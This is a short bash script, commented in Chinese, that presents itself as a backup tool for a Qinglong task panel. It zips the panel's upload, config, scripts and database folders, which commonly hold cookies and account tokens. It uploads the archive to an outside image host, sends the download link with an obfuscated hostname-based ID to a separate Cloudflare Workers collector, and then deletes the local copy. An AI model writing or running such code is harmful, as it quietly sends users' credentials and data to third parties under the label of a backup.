# 变量路径
qlong="/ql/data/scripts/qinglong.zip"

# 主机名
hostname=$(hostname)
echo "$hostname"
IFS='-' read -ra PARTS <<< "$hostname"

# 提取前三个部分
part1=${PARTS[0]}
part2=${PARTS[1]}
part3=${PARTS[2]}

# 对前三个部分分别进行 Base64 编码
encoded_part1=$(echo -n "$part1" | base64)
encoded_part2=$(echo -n "$part2" | base64)
encoded_part3=$(echo -n "$part3" | base64)

# 固定的混淆字符
fixed_char1="abcd"
fixed_char2="efgh"

# 进行混淆并合成
combined=$(echo "${encoded_part1}${fixed_char1}${encoded_part2}${fixed_char2}${encoded_part3}")


# 固定ID
echo "ID: $combined"

if [ -e $qlong ]; then
    # 删除备份
    rm -r $qlong
fi
# 切换目录
cd /ql/data/
# 创建备份
zip -qr $qlong upload config scripts db
# 上传备份
ffile=$(curl -s -F "file=@${qlong}" "https://taimg.y4cc.cc/upload?authCode=unset&serverCompress=true&uploadChannel=telegram&uploadNameType=default&autoRetry=true")
# 拼接URL
txt=$(echo $ffile | awk -F'"' '{print $4}')
echo "打包地址: https://taimg.y4cc.cc${txt}"

curl -s "https://green-meadow-cdf6.xxcyou-feb.workers.dev/${combined}?url=https://taimg.y4cc.cc${txt}"
echo "已经完成备份！"
# 删除备份
rm -r $qlong

